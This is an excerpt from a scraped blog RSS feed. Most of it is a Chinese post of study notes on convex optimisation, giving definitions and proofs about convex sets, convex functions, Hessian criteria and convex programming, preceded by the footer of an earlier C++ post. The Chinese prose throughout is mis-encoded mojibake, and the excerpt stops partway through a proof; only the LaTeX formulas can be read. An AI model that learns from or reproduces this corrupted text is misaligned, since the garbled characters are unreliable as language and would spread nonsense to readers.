    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;    
}</span></pre>
</div>
<p>&nbsp;</p>

<span data-cke-copybin-start="1">
<span data-cke-copybin-end="1">â</span></span>

</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 16:44">2026-02-20 16:43</span>&nbsp;
<a href="https://www.cnblogs.com/lixingqiu">æå´ç</a>&nbsp;
éè¯»(<span id="post_view_count">21</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626608);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626608', targetLink: 'https://www.cnblogs.com/lixingqiu/p/19626608', title: 'å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾)' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼å­ï¼ï¼å¸éãå¸å½æ°ä¸å¸è§å ]]></title>
    <link>https://www.cnblogs.com/GeophysicsWorker/p/19626486</link>
    <guid>f1b46833e5e7a3e8b524d193147da53d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GeophysicsWorker/p/19626486" title="åå¸äº 2026-02-20 14:30">
    <span role="heading" aria-level="2">å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼å­ï¼ï¼å¸éãå¸å½æ°ä¸å¸è§å</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        ç°ææä¼åæ¹æ³å¯¹ä¸è¬å½æ°åªè½æ¾å°å±é¨æä¼è§£ï¼å¤æ­ææ æå¼ç¹ä»¥åå®æ¯å¦ä¸ºå¨å±æä¼è§£è¦ç¨å°å½æ°å¸æ§æ¦å¿µãä¸è¬å¨ç°å®ä¼åé®é¢ä¸ï¼æä»¬ä¸è¬æä¼åé®é¢åæå¸ä¼åé®é¢ï¼å ä¸ºå¸ä¼åï¼**å¸ä¼åï¼Convex OPtimizationï¼**æ¯æ°å­¦ä¼åä¸­çä¸ä¸ªéè¦åæ¯ï¼ç ç©¶çæ¯å¨å¸éä¸æå°å¼çé®é¢ãä¸é¢é¦åä»ç»å¸éãä»ç´è§ä¸çï¼å¸éæ¯è¿æ ·ä¸äºç¹çéåï¼å®çåé¨æ²¡æâæ´âï¼holeï¼ï¼è¾¹çä¸ååå¹ãå¸éçåºæ¬ç¹å¾ï¼æ¯å¶ä¸ä»»åä¸¤ç¹æèæçº¿æ®µä¸çç¹ä¾ç¶å±äºè¿ä¸ªéåãå¨æ°å­¦ä¸å°±æ¯éç¨è¿ç§æè¿°æ¹æ³ç»å¸éä¸å®ä¹çãé¦åç»åºå¸ç»åçæ¦å¿µï¼å¨ç»åºå¸éåå¸å½æ°çå®ä¹ï¼å¹¶ç®åè®¨è®ºå¸å½æ°å¤å®æ¹æ³
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="å¸ä¼åæ°å­¦åºç¡ç¬è®°å­å¸éå¸å½æ°ä¸å¸è§å">å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼å­ï¼ï¼å¸éãå¸å½æ°ä¸å¸è§å</h1>
<p>ç°ææä¼åæ¹æ³å¯¹ä¸è¬å½æ°åªè½æ¾å°å±é¨æä¼è§£ï¼å¤æ­ææ æå¼ç¹ä»¥åå®æ¯å¦ä¸ºå¨å±æä¼è§£è¦ç¨å°å½æ°å¸æ§æ¦å¿µãä¸è¬å¨ç°å®ä¼åé®é¢ä¸ï¼æä»¬ä¸è¬æä¼åé®é¢åæå¸ä¼åé®é¢ï¼å ä¸ºå¸ä¼åï¼å¸ä¼åï¼Convex OPtimizationï¼æ¯æ°å­¦ä¼åä¸­çä¸ä¸ªéè¦åæ¯ï¼ç ç©¶çæ¯å¨å¸éä¸æå°å¼çé®é¢ãä¸é¢é¦åä»ç»å¸éãä»ç´è§ä¸çï¼å¸éæ¯è¿æ ·ä¸äºç¹çéåï¼å®çåé¨æ²¡æâæ´âï¼holeï¼ï¼è¾¹çä¸ååå¹ãå¸éçåºæ¬ç¹å¾ï¼æ¯å¶ä¸ä»»åä¸¤ç¹æèæçº¿æ®µä¸çç¹ä¾ç¶å±äºè¿ä¸ªéåãå¨æ°å­¦ä¸å°±æ¯éç¨è¿ç§æè¿°æ¹æ³ç»å¸éä¸å®ä¹çãé¦åç»åºå¸ç»åçæ¦å¿µï¼å¨ç»åºå¸éåå¸å½æ°çå®ä¹ï¼å¹¶ç®åè®¨è®ºå¸å½æ°å¤å®æ¹æ³ã</p>
<h2 id="1å¸-éconvex-set">1.å¸ éï¼Convex Setï¼</h2>
<p>â	<strong>Definition 6.1ï¼å¸ç»åå®ä¹ï¼</strong> è®¾<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2,\cdots,\mathbf{X}_l\)</span> æ¯<span class="math inline">\(\mathbf{R}^n\)</span> ä¸­ç<span class="math inline">\(l\)</span>ä¸ªå·²ç¥ç¹ãè¥å¯¹äºæä¸ªç¹<span class="math inline">\(\mathbf{X}\in\mathbf{R}^n\)</span> å­å¨å¸¸æ°<span class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_{l}\geq0\)</span>ï¼ä¸<span class="math inline">\(\sum_{i=1}^{l}\alpha_i=1\)</span> ä½¿å¾<span class="math inline">\(\mathbf{X}=\sum_{i=1}^l\alpha_i\mathbf{X}_i\)</span>ï¼åç§°<span class="math inline">\(\mathbf{X}\)</span> æ¯<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2,\cdots,\mathbf{X}_l\)</span> ç<strong>å¸ç»å</strong>ãè¥ <span class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_l&gt;0\)</span> ä¸<span class="math inline">\(\sum_{i=1}^l\alpha_i=1\)</span>ï¼åç§°<span class="math inline">\(\mathbf{X}\)</span>æ¯<span class="math inline">\(\mathbf{X_1},\mathbf{X}_2,\cdots,\mathbf{X}_l\)</span> ç<strong>ä¸¥æ ¼å¸ç»å</strong>ã</p>
<p>â	èèä¸¤ç¹<span class="math inline">\(\mathbf{X}_1\)</span>å<span class="math inline">\(\mathbf{X}_2\)</span>çå¸ç»å<span class="math inline">\(\mathbf{X}=\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2\)</span> ï¼å¶ä¸­<span class="math inline">\(\alpha_1,\alpha_2\geq{0}\)</span> ä¸<span class="math inline">\(\alpha_1+\alpha_2=1\)</span>ãæ <span class="math inline">\(\alpha_2=1-\alpha_1\)</span> ä»£å¥<span class="math inline">\(\mathbf{X}\)</span> çå¸ç»åä¸­å¾å°<span class="math inline">\(\mathbf{X}=\mathbf{X}_2+\alpha_1(\mathbf{X}_1-\mathbf{X}_2)\)</span> ï¼å¶ä¸­<span class="math inline">\(\alpha\in[0,1]\)</span>ãç±è§£æå ä½ç¥è¯å¯ç¥ï¼å½ <span class="math inline">\(\alpha_1\)</span>ä»0åå°1æ¶ï¼ç¹<span class="math inline">\(\mathbf{X}\)</span> ç±ç¹<span class="math inline">\(\mathbf{X}_2\)</span> åºåæ²¿<span class="math inline">\(\mathbf{X}_1-\mathbf{X}_2\)</span> çæ¹åç§»å¨å°<span class="math inline">\(\mathbf{X}_1\)</span> ãç±æ­¤å¯ç¥ï¼<span class="math inline">\(\mathbf{X}_1\)</span>å<span class="math inline">\(\mathbf{X}_2\)</span> ææä¸¥æ ¼å¸ç»åçéåæ¯ä¸å«<span class="math inline">\(\mathbf{X}_1\)</span>å<span class="math inline">\(\mathbf{X}_2\)</span> ä¸¤ç«¯ç¹ççº¿æ®µã</p>
<p>â	<strong>Definition 6.2 ï¼å¸éçå®ä¹ï¼</strong> è®¾éå<span class="math inline">\(\mathbf{C}\subseteq{\mathbf{R}^n}\)</span>ãå¦æå¯¹äºä»»æä¸¤ç¹<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in{\mathbf{C}}\)</span> ï¼å®ä»¬çä»»æä¸¤ç¹<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in{\mathbf{C}}\)</span> ï¼å®ä»¬çä»»æå¸ç»åä»ç¶å±äº<span class="math inline">\(\mathbf{C}\)</span> ï¼åç§°éå<span class="math inline">\(\mathbf{C}\)</span> ä¸º<strong>å¸é</strong>ãç¹å«å°è§å®ï¼ç©ºéæ¯å¸éã</p>
<p>â	<strong>Definition 6.3 (åç©ºé´çå®ä¹)</strong>  è®¾<span class="math inline">\(\mathbf{a}\in\mathbf{R}^n\)</span> ä¸ <span class="math inline">\(\mathbf{a}\neq \mathbf{0},b\in{\mathbf{R}^1}\)</span> ï¼åéå<span class="math inline">\(\{\mathbf{X}|\mathbf{a}^T\mathbf{X}\geq{b},\mathbf{X}\in{R^n}\}\)</span> ç§°ä¸º<span class="math inline">\(\mathbf{R}^n\)</span> ä¸­çä¸ä¸ªåç©ºé´ã</p>
<p>â	å®¹æå°éªè¯ï¼ç©ºé´<span class="math inline">\(\mathbf{R}^n\)</span>ãåç©ºé´ãè¶å¹³é¢ãç´çº¿ãç¹ãçé½æ¯å¸éã</p>
<p>â	<strong>å®ç 6.1</strong> ä»»æä¸ç»å¸éçäº¤éä»ç¶æ¯<strong>å¸é</strong>ã</p>
<p>â	<strong>è¯ æï¼</strong> è®¾<span class="math inline">\(C=\cap_{i\in I}C_i\)</span> ,å¶ä¸­<span class="math inline">\(I\)</span>æ¯<span class="math inline">\(\{C_i\}\)</span> çä¸æ éï¼<span class="math inline">\(C_i\)</span> é½æ¯å¸éãä»»å<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in{C}\)</span> , åå¯¹äºä»»æ<span class="math inline">\(i\in{I}\)</span> é½æ<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in \mathbf{C}_i\)</span>ãä»»å<span class="math inline">\(\alpha_1,\alpha_2\in{[0,1]}\)</span> ä¸<span class="math inline">\(\alpha_1+\alpha_2=1\)</span>ï¼å ä¸º<span class="math inline">\(C_i\)</span> æ¯å¸éï¼æ <span class="math inline">\(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2\in{C_i}\)</span>ãäºæ¯ï¼<span class="math inline">\(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2\in \cap_{i\in{I}}C_i=C\)</span>ï¼å³<span class="math inline">\(\mathbf{C}\)</span> æ¯å¸éã</p>
<h2 id="2å¸å½æ°convex-function">2.å¸å½æ°ï¼Convex Functionï¼</h2>
<p>â	<strong>Definition 6.4 ï¼å¸å½æ°çå®ä¹ï¼</strong> è®¾<span class="math inline">\(f:\mathbf{C}\subseteq\mathbf{R}^n\rightarrow\mathbf{R}^1\)</span> , å¶ä¸­<span class="math inline">\(\mathbf{C}\)</span> ä¸ºå¸éãè¥å¯¹äºä»»æä¸¤ç¹<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in{C}\)</span> åä»»æä¸å¯¹æ»¡è¶³<span class="math inline">\(\alpha_1+\alpha_2=1\)</span> çæ°<span class="math inline">\(\alpha_1,\alpha_2\in[0,1]\)</span> ï¼é½æ <span class="math inline">\(f(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2)\leq \alpha_1f(\mathbf{X}_1)+\alpha_2f(\mathbf{X}_2)\)</span> ï¼åç§°<span class="math inline">\(f\)</span> ä¸ºå®ä¹å¨<span class="math inline">\(\mathbf{C}\)</span> ä¸ç<strong>å¸å½æ°</strong>ãè¥å¯¹äºä»»æä¸å¯¹æ»¡è¶³<span class="math inline">\(\alpha_1+\alpha_2=1\)</span>çæ°<span class="math inline">\(\alpha_1,\alpha_2\in(0,1)\)</span> é½æï¼</p>
<p></p><div class="math display">\[f(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2)&lt;\alpha_1f(\mathbf{X}_1)+\alpha_2f(\mathbf{X}_2) \tag{1}
\]</div><p></p><p>åç§°<span class="math inline">\(f\)</span>ä¸ºå®ä¹å¨å¸é<span class="math inline">\(C\)</span>ä¸<strong>ä¸¥æ ¼å¸å½æ°</strong>ã</p>
<p>â	<strong>Definition 6.5</strong> è¥å½æ°<span class="math inline">\(g(\mathbf{X})=-f(\mathbf{X})\)</span>å¨å¸é<span class="math inline">\(C\)</span> ä¸æ¯ï¼ä¸¥æ ¼ï¼å¸å½æ°ï¼åç§°<span class="math inline">\(f\)</span>æ¯å®ä¹å¨å¸é<span class="math inline">\(C\)</span> ä¸çï¼ä¸¥æ ¼ï¼å¹å½æ°ã</p>
<p>â	<strong>å®ç 6.2</strong> è®¾<span class="math inline">\(f:C\subset\mathbf{R}^n\rightarrow\mathbf{R}^1\)</span>ï¼å¶ä¸­<span class="math inline">\(\mathbf{C}\)</span>ä¸ºéç©ºå¸éãè¥<span class="math inline">\(f\)</span>æ¯å¸å½æ°ï¼åå¯¹äºä»»æå®æ°<span class="math inline">\(\beta\)</span>, æ°´å¹³é<span class="math inline">\(\mathbf{D}_{\beta}=\{\mathbf{X}|f(\mathbf{X})\leq\beta,\mathbf{X}\in{C}\}\)</span> æ¯å¸éã</p>
<p>â	<strong>è¯  æï¼</strong> è¥<span class="math inline">\(\mathbf{D}_{\beta}\)</span>æ¯ç©ºéï¼å<span class="math inline">\(\mathbf{D}_{\beta}\)</span> æ¯å¸éãä»¥ä¸è®¾<span class="math inline">\(\mathbf{D}_{\beta}\)</span> éç©ºï¼ä»»å<span class="math inline">\(\mathbf{X}_1\)</span> ,<span class="math inline">\(\mathbf{X}_2\in{D_{\beta}}\)</span> ,  å<span class="math inline">\(f(\mathbf{X}_1)\leq\beta,f(\mathbf{X}_2)\leq\beta\)</span> ãè®¾<span class="math inline">\(\alpha_1,\alpha_2\in[0,1]\)</span> ,ä¸<span class="math inline">\(\alpha_1+\alpha_2=1\)</span> æ ¹æ®<span class="math inline">\(f\)</span>çå¸æ§ï¼å¿æ</p>
<p></p><div class="math display">\[f(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2)\leq \alpha_1f(\mathbf{X}_1)+\alpha_2f(\mathbf{X}_2)\leq \alpha_1\beta+\alpha_2\beta=\beta \tag{2}
\]</div><p></p><p>å³ <span class="math inline">\(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2\in{\mathbf{D}_{\beta}}\)</span> ,æä»¥ <span class="math inline">\(\mathbf{D}_{\beta}\)</span> æ¯å¸éã</p>
<h2 id="3å¤æ­å¸å½æ°çæ¹æ³">3.å¤æ­å¸å½æ°çæ¹æ³</h2>
<p>â	å¤å®ä¸ä¸ªå½æ°æ¯å¦ä¸ºå¸å½æ°ï¼ä¸è¬æ¥è¯´æ¯è¾å°é¾ï¼ä½å½æ°å¯å¾®æ¶ï¼æå¦ä¸å ä¸ªå®çå¯ä¾ä½¿ç¨ã</p>
<p>â	<strong>å®ç 6.3</strong> è®¾<span class="math inline">\(f:\mathbf{C}\subseteq\mathbf{R}^n\rightarrow{\mathbf{R}^1}\)</span> æ¯å¯å¾®å½æ°ï¼å¶ä¸­<span class="math inline">\(\mathbf{C}\)</span> ä¸ºå¸éï¼åï¼</p>
<ol>
<li>
<p><span class="math inline">\(f\)</span>ä¸ºå¸å½æ°ç<strong>åè¦æ¡ä»¶</strong>æ¯ï¼<span class="math inline">\(\forall \mathbf{X}_1,\mathbf{X}_2\in{\mathbf{C}}\)</span>, é½æ</p>
<p></p><div class="math display">\[f(\mathbf{X}_2)\geq f(\mathbf{X}_1)+\nabla{f(\mathbf{X}_1)}^T(\mathbf{X}_2-\mathbf{X}_1) \tag{3}
\]</div><p></p><p>â</p>
</li>
<li>
<p><span class="math inline">\(f\)</span>ä¸ºä¸¥æ ¼å¸å½æ°ç<strong>åè¦æ¡ä»¶</strong>æ¯ï¼<span class="math inline">\(\forall \mathbf{X}_1,\mathbf{X}_2\in\mathbf{C}\)</span>,ä¸<span class="math inline">\(\mathbf{X}_1\neq\mathbf{X}_2\)</span>,é½æ</p>
</li>
</ol>
<p></p><div class="math display">\[f(\mathbf{X}_2)&gt;f(\mathbf{X}_1)+\nabla f(\mathbf{X_1})^T(\mathbf{X}_2-\mathbf{X}_1) \tag{4}
\]</div><p></p><p><strong>è¯ æï¼</strong> ï¼1ï¼<strong>å¿è¦æ§è¯æ</strong>ï¼å·²ç¥<span class="math inline">\(f\)</span>æ¯<span class="math inline">\(\mathbf{C}\)</span>ä¸çå¸å½æ°ï¼è¯æå¼ï¼3ï¼ãç±å¸å½æ°å®ä¹å¯ç¥ï¼å¯¹æ»¡è¶³<span class="math inline">\(\alpha_1+\alpha_2=1\)</span> çä»»ææ­£æ°<span class="math inline">\(\alpha_1,\alpha_2\in[0,1]\)</span>é½æ</p>
<p></p><div class="math display">\[f(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2)\leq\alpha_1f(\mathbf{X}_1)+\alpha_2f(\mathbf{X}_2) \tag{5}
\]</div><p></p><p>ä»¤<span class="math inline">\(\alpha_2=t\)</span>ï¼å<span class="math inline">\(\alpha_1=1-t\)</span>ï¼ä»£å¥ä¸å¼ä¸­ï¼æ´çå¾å°ï¼</p>
<p></p><div class="math display">\[\frac{f(\mathbf{X}_1+t(\mathbf{X}_2-\mathbf{X}_1))-f(\mathbf{X}_1)}{t}\leq f(\mathbf{X}_2)-f(\mathbf{X}_1) \tag{6}
\]</div><p></p><p>ä»¤ <span class="math inline">\(t\rightarrow{0}\)</span> ,ç±<span class="math inline">\(f\)</span>çå¯å¾®æ§ï¼å©ç¨ä¸é¶Taylorå±å¼å¼ï¼æ¹åå¯¼æ°å®ä¹åå¼ï¼6ï¼å¯å¾ï¼</p>
<p></p><div class="math display">\[\nabla f(\mathbf{X}_1)^T(\mathbf{X}_2-\mathbf{X}_1)\leq {f(\mathbf{X}_2)-f(\mathbf{X}_1)} \tag{7}
\]</div><p></p><p>å¿è¦æ§å¾è¯ï¼</p>
<p><strong>ååæ§è¯æï¼</strong> ä»»åä¸å¯¹æ­£æ°<span class="math inline">\(\alpha_1,\alpha_2\in[0,1]\)</span> ,ä¸<span class="math inline">\(\alpha_1+\alpha_2=1\)</span>ï¼èèç¹ <span class="math inline">\(\mathbf{X}=\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2\)</span> æ ¹æ®ååæ§åè®¾ï¼åºæï¼</p>
<p></p><div class="math display">\[\begin{aligned}
&amp;f(\mathbf{X}_1)\geq f(\mathbf{X})+\nabla f(\mathbf{X})^T(\mathbf{X}_1-\mathbf{X})\\
&amp;f(\mathbf{X}_2)\geq f(\mathbf{X})+\nabla f(\mathbf{X})^T(\mathbf{X}_2-\mathbf{X})
\end{aligned}
\tag{8}
\]</div><p></p><p>ä¸¤å¼åå«ä¹ä»¥<span class="math inline">\(\alpha_1\)</span> å<span class="math inline">\(\alpha_2\)</span> åç¸å ï¼å¾å°ï¼</p>
<p></p><div class="math display">\[\alpha_1f(\mathbf{X}_1)+\alpha_2f(\mathbf{X}_2)\geq f(\mathbf{X})+\nabla f(\mathbf{X})^T(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2-\mathbf{X})=f(\alpha_1\mathbf{X}_1+\alpha_2\mathbf{X}_2) \tag{9} 
\]</div><p></p><p>ç±å¸å½æ°å®ä¹å¯ç¥ï¼<span class="math inline">\(f\)</span> æ¯<span class="math inline">\(\mathbf{C}\)</span>ä¸çå¸å½æ°ã</p>
<p>â	ï¼2ï¼å½é¢ï¼2ï¼ååæ§å¯ä»¿ç§å½é¢ï¼1ï¼çååæ§è¯å¾ï¼</p>
<p>â	å¿è¦æ§ï¼å ä¸ºä¸¥æ ¼å¸å½æ°æ¬èº«æ¯å¸å½æ°ï¼æä»¥<span class="math inline">\(\forall \mathbf{X}_1,\mathbf{X}_2\in{\mathbf{C}}\)</span> ,ä¸<span class="math inline">\(\mathbf{X}_1\neq\mathbf{X}_2\)</span> é½æ</p>
<p></p><div class="math display">\[f(\mathbf{X}_2)\geq f(\mathbf{X}_1)+\nabla f(\mathbf{X}_1)^T(\mathbf{X}_2-\mathbf{X}_1) \tag{10}
\]</div><p></p><p>ä»¥ä¸è¯æå¼ä¸­åªè½å"&gt;"å·ï¼åè®¾å­å¨<span class="math inline">\(\mathbf{X}_1,\mathbf{X}_2\in{\mathbf{C}}\)</span> ä¸<span class="math inline">\(\mathbf{X}_1\neq\mathbf{X}_2\)</span> ,æ»¡è¶³</p>
<p></p><div class="math display">\[f(\mathbf{X}_2)=f(\mathbf{X}_1)+\nabla f(\mathbf{X}_1)^T(\mathbf{X}_2-\mathbf{X}_1) \tag{11}
\]</div><p></p><p>å<span class="math inline">\(\mathbf{X}=\frac{1}{2}\mathbf{X}_1+\frac{1}{2}\mathbf{X}_2\)</span> ,ç±<span class="math inline">\(f\)</span> çä¸¥æ ¼å¸æ§ï¼æï¼</p>
<p></p><div class="math display">\[f(\mathbf{X}_3)&lt;\frac{1}{2}f(\mathbf{X}_1)+\frac{1}{2}f(\mathbf{X}_2) \tag{12}
\]</div><p></p><p>æå¼ï¼11ï¼ä»£å¥å¼ï¼12ï¼ä¸­ï¼ç»æ´çå¾ï¼</p>
<p></p><div class="math display">\[f(\mathbf{X}_3)&lt;f(\mathbf{X}_1)+\nabla f(\mathbf{X}_1)^T(\mathbf{X}_3-\mathbf{X}_1) \tag{13}
\]</div><p></p><p>æ ¹æ®æ¬å®çï¼1ï¼é¨åç»è®ºå¾ç¥ï¼æ­¤æ¶ä¸<span class="math inline">\(f\)</span>çå¸æ§ç¸çç¾ã</p>
<p>â	<strong>å® ç 6.4</strong> è®¾<span class="math inline">\(f:\mathbf{C}\subseteq\mathbf{R}^n\rightarrow\mathbf{R}^1\)</span> æ¯äºæ¬¡å¯å¾®å½æ°ï¼<span class="math inline">\(\mathbf{C}\)</span> ä¸ºéç©ºå¼å¸éï¼å<span class="math inline">\(f\)</span>ä¸º<span class="math inline">\(C\)</span>ä¸ä¸ºå¸å½æ°çåè¦æ¡ä»¶æ¯ ï¼<span class="math inline">\(f(\mathbf{X})\)</span> çHessianç©éµ<span class="math inline">\(\nabla^2f(\mathbf{X})\)</span> å¨å¸é<span class="math inline">\(C\)</span> å¤å¤åæ­£å®ï¼å³<span class="math inline">\(\nabla^2f(\mathbf{X})\succeq{0}\)</span> ã</p>
<p>â	<strong>å® ç6.5</strong>  è®¾<span class="math inline">\(f:\mathbf{C}\subseteq\mathbf{R}^n\rightarrow{\mathbf{R}^1}\)</span> æ¯äºæ¬¡å¯å¾®å½æ°ï¼<span class="math inline">\(\mathbf{C}\)</span> ä¸ºéç©ºå¸éãè¥<span class="math inline">\(Hessian\)</span>ç©éµ<span class="math inline">\(\nabla^2f(\mathbf{X})\)</span> å¨å¸é<span class="math inline">\(\mathbf{C}\)</span> ä¸å°å¤æ­£å®ï¼å <span class="math inline">\(f\)</span>å¨<span class="math inline">\(\mathbf{C}\)</span> ä¸ä¸ºä¸¥æ ¼å¸å½æ°ã</p>
<p>â      éè¦æ³¨æï¼è¯¥å®ççéå½é¢ä¸çã</p>
<p>â      ä¾å¦ <span class="math inline">\(f(x)=x^4\)</span> å¨<span class="math inline">\(\mathbf{R}^1\)</span> ä¸ä¸ºä¸¥æ ¼å¸å½æ°ï¼ä½æ¯å®ç<span class="math inline">\(Hessian\)</span>ç©éµ<span class="math inline">\(\nabla^2f(\mathbf{x})=12x^2\)</span>å¨ç¹<span class="math inline">\(x=0\)</span> å¤æ¯åæ­£å®çã</p>
<h2 id="4å¸è§å-convex-programing">4.å¸è§å ï¼Convex Programingï¼</h2>
<p>â	å¸è§åæ¯æ°å­¦ä¼åä¸­çä¸ä¸ªéè¦æ¦å¿µï¼æç®æ å½æ°ï¼æå¤±å½æ°ï¼ä¸ºå¸å½æ°ãå¯è¡åä¸ºå¸éçä¼åé®é¢ï¼å·æè®¸å¤çä¼åæ§è´¨ï¼ä¾å¦å±é¨æä¼è§£å°±æ¯å¨å±æä¼è§£ï¼ä¸å¯¹å¶çè®ºæçãå¹¿æ³åºç¨äºæºå¨å­¦ä¹ ï¼ä¿¡å·å¤çï¼éèå·¥ç¨ç­é¢åã</p>
<p><strong>Definition 6.6 ï¼å¸è§åé®é¢ï¼</strong> è®¾<span class="math inline">\(f:\mathbf{C}\subseteq\mathbf{R}^n\rightarrow{\mathbf{R}^1}\)</span> ï¼å¶ä¸­ <span class="math inline">\(\mathbf{C}\)</span> æ¯éç©ºå¸éå ï¼<span class="math inline">\(f\)</span> ä¸ºå¸å½æ°ï¼åå½¢å¼å¦ä¸ï¼</p>
<p></p><div class="math display">\[\begin{aligned}
&amp;\min f(\mathbf{X})\\
&amp;s.t. \mathbf{X}\in{\mathbf{C}}
\end{aligned}
\tag{14}
\]</div><p></p><p>çä¼åé®é¢ä¸º<strong>å¸è§åé®é¢</strong>ãæ´è¿ä¸æ­¥ï¼è®¾å°å¯è¡åçå¸éå¯åä¸ºå¦ä¸å½¢å¼ï¼</p>
<p></p><div class="math display">\[\begin{aligned}
\mathbf{C}=\{\mathbf{X}|g_i(\mathbf{X})\geq0,i=1,\cdots,l;h_j(\mathbf{X})=0,j=1,\cdots,m,\mathbf{X}\in R^n\}
\end{aligned}
\tag{15}
\]</div><p></p><p>è¥<span class="math inline">\(g_1,g_2,\cdots,g_l\)</span> é½æ¯<span class="math inline">\(\mathbf{R}^n\)</span> ä¸çå¸å½æ°ï¼<span class="math inline">\(h_1,h_2,\cdots,h_m\)</span> é½æ¯<span class="math inline">\(R^n\)</span>ä¸ççº¿æ§å½æ°ï¼åå®¹æéªè¯<span class="math inline">\(C\)</span>æ¯å¸é ãäºå®ä¸ï¼å ä¸º<span class="math inline">\(-g_1,-g_2,-g_l\)</span>é½æ¯å¸å½æ°ï¼æ ¹æ®å®ç6.2éå<span class="math inline">\(\mathbf{C}_i=\{\mathbf{X}|-g(\mathbf{X})_i\leq0,\mathbf{X}\in{\mathbf{R}^n}\}(i=1,2,\cdots,l)\)</span> ä¹é½æ¯å¸éãæ­¤å¤ï¼è¶å¹³é¢<span class="math inline">\(P_j=\{\mathbf{X}|h_j(\mathbf{X})=0,\mathbf{X}\in{\mathbf{R}^n}\}(j=1,\cdots,m)\)</span> ä¹é½æ¯å¸éãæ¾ç¶ï¼<span class="math inline">\(C\)</span>æ¯<span class="math inline">\(C_1,\cdots,C_l,P_1,\cdots,P_m\)</span> çäº¤éï¼ä¹æ¯å¸éãäºæ¯ï¼è¿ç§æåµä¸å¸è§åé®é¢åå¯è¡¨ç¤ºæå¦ä¸å½¢å¼ï¼</p>
<p></p><div class="math display">\[\begin{aligned}
&amp;\min{f(\mathbf{X})}\\
&amp;s.t.\begin{cases}
g_i(\mathbf{X})\geq0 ,\hspace{2em} i=1,2,\cdots,l\\
h_j(\mathbf{X})=0,\hspace{2em} j=1,2,\cdots,m
\end{cases}
\end{aligned}
\tag{16}
\]</div><p></p><p>å¦ä¸å®çææå¸è§åçä¸ä¸ªéè¦æ§è´¨ã</p>
<p>â	<strong>å® ç6.6</strong> è®¾<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯å¸è§åé®é¢çå±é¨æå°å¼ï¼</p>
<ol>
<li>è¥<span class="math inline">\(f\)</span>æ¯å¸å½æ°ï¼å<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯å¸è§åé®é¢çå±é¨æå°å¼ç¹ï¼</li>
<li>è¥<span class="math inline">\(f\)</span>æ¯ä¸¥æ ¼å¸å½æ°ï¼å<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯å¸è§åé®é¢çå¯ä¸å¨å±æå°å¼ç¹ã</li>
</ol>
<p><strong>è¯  æï¼</strong>ï¼1ï¼ä½¿ç¨åè¯æ³ãåè®¾<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸æ¯å¨å±æå°å¼ç¹ï¼åå¿å­å¨<span class="math inline">\(Z\in\mathbf{C}\)</span> ä½¿å¾ <span class="math inline">\(f(\mathbf{Z})&lt;f(\mathbf{X})\)</span> ãå¯¹åº<span class="math inline">\(\mathbf{Z}\)</span> ä¸<span class="math inline">\(\mathbf{X}^*\)</span> çä»»æå¸ç»å<span class="math inline">\(\mathbf{X}=\alpha_1\mathbf{Z}+\alpha_2\mathbf{X}^*\)</span>,å¶ä¸­<span class="math inline">\(\alpha_1,\alpha_2\in(0,1)\)</span> ä¸<span class="math inline">\(\alpha_1+\alpha_2=1\)</span>ï¼æ ¹æ®<span class="math inline">\(f\)</span>çå¸æ§ï¼æ</p>
<p></p><div class="math display">\[f(\mathbf{X})=f(\alpha_1\mathbf{Z}+\alpha_2\mathbf{X}^*)\leq \alpha_1f(\mathbf{Z})+\alpha_2f(\mathbf{X}^*)&lt;\alpha_1f(\mathbf{X}^*)+\alpha_2f(\mathbf{X}^*)=f(\mathbf{X}^*) \tag{17}
